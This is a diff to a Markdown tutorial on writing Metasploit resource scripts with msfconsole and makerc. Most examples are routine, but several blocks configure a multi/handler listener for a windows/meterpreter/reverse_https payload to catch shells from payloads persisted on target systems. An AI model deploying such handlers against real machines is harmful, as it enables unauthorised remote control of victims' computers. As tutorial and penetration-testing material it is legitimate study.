@@ -48,7 +48,7 @@
 ## HOW TO WRITE RESOURCE SCRIPTS?
 <blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. Personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the resource command.</blockquote>
 
-- **Resource file to display the version number of metasploit::**`[version.rc]`<br />
+- **Resource file to display the version number of metasploit::**`[script: version.rc]`<br />
 
 ```
   version
@@ -58,7 +58,7 @@
 
 <br />
 
-- **Resource file to display the version number of metasploit (makerc)::**`[version.rc]`<br />
+- **Resource file to display the version number of metasploit (makerc)::**`[script: version.rc]`<br />
 ```
    kali > msfconsole
    msf > version
@@ -70,46 +70,48 @@
 
 <blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>
 
-- **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />
+- **Resource file to start one handler::**`[script: handler.rc]`<br />
 
-      touch handler.rc
+```
+   use exploit/multi/handler
+      set PAYLOAD windows/meterpreter/reverse_https
+      set ExitOnSession false
+      set LHOST 192.168.1.71
+      set LPORT 666
+   exploit
+```
+`[run]` msfconsole -r /root/handler.rc
 
-         echo 'use exploit/multi/handler' > handler.rc
-         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
-         echo 'set ExitOnSession false' >> handler.rc
-         echo 'set LHOST 192.168.1.71' >> handler.rc
-         echo 'set LPORT 666' >> handler.rc
-         echo 'exploit' >> handler.rc
+<br />
 
-    `[run]` msfconsole -r /root/handler.rc
+- **Resource file to start one handle (makerc)::**`[script: handler.rc]`<br />
 
-- **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />
+```
+   kali > msfconsole
+   msf > use exploit/multi/handler
+   msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+   msf exploit(multi/handler) > set ExitOnSession false
+   msf exploit(multi/handler) > set LHOST 192.168.1.71
+   msf exploit(multi/handler) > set LPORT 666
+   msf exploit(multi/handler) > exploit
 
-      kali > msfconsole
-      msf > use exploit/multi/handler
-      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
-      msf exploit(multi/handler) > set ExitOnSession false
-      msf exploit(multi/handler) > set LHOST 192.168.1.71
-      msf exploit(multi/handler) > set LPORT 666
-      msf exploit(multi/handler) > exploit
-
-      msf exploit(multi/handler) > makerc /root/handler.rc
-
-    `[run] msf >` resource /root/handler.rc
+   msf exploit(multi/handler) > makerc /root/handler.rc
+```
+`[run] msf >` resource /root/handler.rc
 
 <br /><br />
 
 <blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>
 
-- **Create a rc file to record session activity, load my auxiliarys and exec handler.rc::**`[record.rc]`<br />
+- **Resource file to record session activity, load my auxiliarys and exec handler.rc::**`[script: record.rc]`<br />
 
 ```
-spool /root/logfile.log
-version
-sessions -v
-loadpath /root/msf-auxiliarys
-resource /root/handler.rc
-makerc /root/commands.rc
+   spool /root/logfile.log
+      version
+      sessions -v
+      loadpath /root/msf-auxiliarys
+      resource /root/handler.rc
+   makerc /root/commands.rc
 ```
 `[run]` msfconsole -r /root/record.rc
 
